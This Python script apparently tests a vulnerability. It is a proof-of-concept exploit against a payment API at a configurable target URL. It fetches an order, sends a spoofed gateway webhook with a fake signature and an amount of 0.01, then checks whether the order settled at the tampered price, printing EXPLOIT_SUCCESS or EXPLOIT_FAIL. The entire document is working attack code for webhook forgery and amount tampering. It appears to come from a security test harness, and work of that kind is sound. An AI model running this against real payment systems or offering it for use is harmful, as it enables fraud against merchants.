import os, sys, requests

base = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')

try:
    # Step 1: fetch original order to know authoritative amount
    r0 = requests.get(f'{base}/api/payments/order/order-1001', timeout=4)
    if r0.status_code != 200:
        print(f'EXPLOIT_FAIL: could not fetch original order (status {r0.status_code})')
        sys.exit(0)
    original_amount = r0.json().get('amount', 'unknown')

    # Step 2: send spoofed webhook with tampered amount
    payload = {'orderId': 'order-1001', 'amount': 0.01, 'signature': 'fake-sig'}
    r1 = requests.post(f'{base}/api/webhook/gateway', json=payload, timeout=4)
    if r1.status_code != 200:
        print(f'EXPLOIT_FAIL: webhook rejected (status {r1.status_code}): {r1.text[:120]}')
        sys.exit(0)
    resp = r1.json()

    # Step 3: verify order is now settled at tampered amount
    r2 = requests.get(f'{base}/api/payments/order/order-1001', timeout=4)
    settled = r2.json() if r2.status_code == 200 else {}
    settled_amount = settled.get('amount', 'unknown')
    settled_status = settled.get('status', 'unknown')

    if settled_status == 'settled' and str(settled_amount) != str(original_amount):
        print(f'EXPLOIT_SUCCESS: order order-1001 settled at tampered amount={settled_amount} (original={original_amount}); server never reconciled against authoritative DB')
    elif settled_status == 'settled':
        print(f'EXPLOIT_FAIL: order settled but amount unchanged ({settled_amount}); server may have ignored webhook amount')
    else:
        print(f'EXPLOIT_FAIL: unexpected state status={settled_status} amount={settled_amount}')
except Exception as e:
    print(f'EXPLOIT_FAIL: exception - {e}')
sys.exit(0)

